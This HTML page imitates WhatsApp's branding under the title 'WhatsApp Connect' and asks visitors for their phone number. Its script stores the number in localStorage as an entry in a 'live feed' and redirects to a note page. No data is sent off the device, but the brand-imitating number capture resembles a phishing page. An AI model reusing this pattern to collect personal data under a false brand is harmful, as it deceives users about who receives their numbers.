<!-- whatsapp.html -->

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport"
content="width=device-width, initial-scale=1.0">

<title>WhatsApp Connect</title>

<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">

<style>

*{
margin:0;
padding:0;
box-sizing:border-box;
font-family:'Poppins',sans-serif;
}

body{
height:100vh;
display:flex;
justify-content:center;
align-items:center;
background:#e5ddd5;
overflow:hidden;
}

/* WhatsApp background pattern */

body::before{
content:'';
position:absolute;
width:100%;
height:100%;
background-image:
radial-gradient(#d1d7db 1px, transparent 1px);
background-size:22px 22px;
opacity:0.4;
z-index:-1;
}

/* Card */

.container{
width:90%;
max-width:400px;
background:white;
padding:35px 25px;
border-radius:25px;
box-shadow:0 10px 40px rgba(0,0,0,0.12);
text-align:center;
}

/* Logo */

.logo{
width:95px;
margin-bottom:15px;
}

/* Title */

h1{
font-size:32px;
font-weight:700;
color:#111b21;
margin-bottom:25px;
}

/* Input */

.input-box{
width:100%;
padding:16px;
border:none;
outline:none;
border-radius:15px;
background:#f0f2f5;
font-size:16px;
margin-bottom:20px;
border:2px solid transparent;
transition:0.3s;
}

.input-box:focus{
border-color:#25d366;
background:white;
}

.input-box::placeholder{
color:#667781;
}

/* Button */

.btn{
width:100%;
padding:15px;
border:none;
border-radius:15px;
background:#25d366;
color:white;
font-size:17px;
font-weight:600;
cursor:pointer;
transition:0.3s;
}

.btn:hover{
transform:scale(1.03);
background:#20bd5a;
}

</style>
</head>

<body>

<div class="container">

<img class="logo"
src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg">

<h1>I'm In</h1>

<input
type="text"
id="number"
class="input-box"
placeholder="Input your number ✌">

<button class="btn"
onclick="continuePage()">

Continue

</button>

</div>

<script>

function continuePage(){

const number =
document.getElementById("number").value;

if(!number){

alert("Input number first");

return;

}

/* GET ID */

const params =
new URLSearchParams(window.location.search);

const id =
params.get("id") ||
Math.random().toString(36).substring(2,8);

/* SAVE NUMBER */

localStorage.setItem(
"wa_number",
number
);

/* SEND NUMBER TO LIVE FEED */

const data = {

id:id,

platform:"WhatsApp",

name:number,

note:"Waiting for note...",

time:new Date().toLocaleString()

};

localStorage.setItem(
"userFeed_" + id,
JSON.stringify(data)
);

/* NEXT PAGE */

window.location.href =
"note.html?id=" + id;

}

</script>

</body>
</html>
